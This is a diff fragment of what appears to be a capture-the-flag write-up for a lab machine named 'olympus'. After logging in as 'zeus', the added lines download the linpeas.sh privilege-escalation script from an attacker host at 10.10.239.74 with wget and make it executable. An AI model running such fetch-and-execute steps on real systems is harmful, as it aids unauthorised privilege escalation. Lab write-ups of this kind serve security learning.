@@ -325,7 +325,19 @@ To check for new updates run: sudo apt update
 
 Last login: Sat Jul 16 07:52:39 2022
 zeus@olympus:~$ 
-
-
 ```
+
+zeus@olympus:~$ wget http://10.10.239.74:1234/linpeas.sh
+--2023-03-09 13:11:31--  http://10.10.239.74:1234/linpeas.sh
+Connecting to 10.10.239.74:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 233380 (228K) [text/x-sh]
+Saving to: \u2018linpeas.sh\u2019
+
+linpeas.sh                                           100%[=====================================================================================================================>] 227.91K  --.-KB/s    in 0.03s   
+
+2023-03-09 13:11:31 (8.17 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]
+
+zeus@olympus:~$ chmod +x linpeas.sh 
+
 
